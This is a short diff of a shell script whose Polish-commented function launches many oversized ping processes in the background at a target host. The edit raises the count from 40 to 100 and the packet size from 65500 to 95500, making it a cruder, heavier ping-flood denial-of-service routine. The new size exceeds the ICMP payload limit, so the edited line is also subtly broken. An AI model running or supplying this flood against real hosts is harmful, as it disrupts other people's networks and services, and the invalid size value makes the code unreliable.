@@ -79,8 +79,8 @@ check_errors() {
 
 # Funkcja do wysyłania wielu pakietów ping o maksymalnej wielkości
 send_big_pings() {
-    for i in {1..40}; do
-        ping $1 -s 65500 &
+    for i in {1..100}; do
+        ping $1 -s 95500 &
     done
 }
 
